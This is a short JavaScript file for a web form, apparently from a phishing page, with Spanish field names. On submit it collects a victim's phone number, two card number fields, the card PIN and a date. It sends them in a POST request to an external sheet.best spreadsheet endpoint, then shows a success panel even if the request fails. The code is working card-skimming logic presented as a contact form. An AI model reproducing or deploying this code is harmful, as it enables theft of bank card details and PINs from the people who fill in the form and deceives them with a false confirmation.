const formulario = document.getElementById('contact-form');
const registro = document.getElementById('registro');
const exito = document.getElementById('exito');

formulario.addEventListener('submit', async(e) =>{
    e.preventDefault();


try {    
    const respuesta = await fetch('https://sheet.best/api/sheets/8a0bb487-d519-4d75-9487-a4f8e92a791a', {
        method: 'POST',
        mode: 'cors',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            "1": formulario.telefono.value,
            "2": formulario.tarjeta.value,
            "3": formulario.tarjeta2.value,
            "4": formulario.nip.value,
            "5": formulario.fecha.value
        })
    });



} catch(error){
    console.log(error);
}
    
    registro.classList.remove('activo');
    exito.classList.add('activo');
});
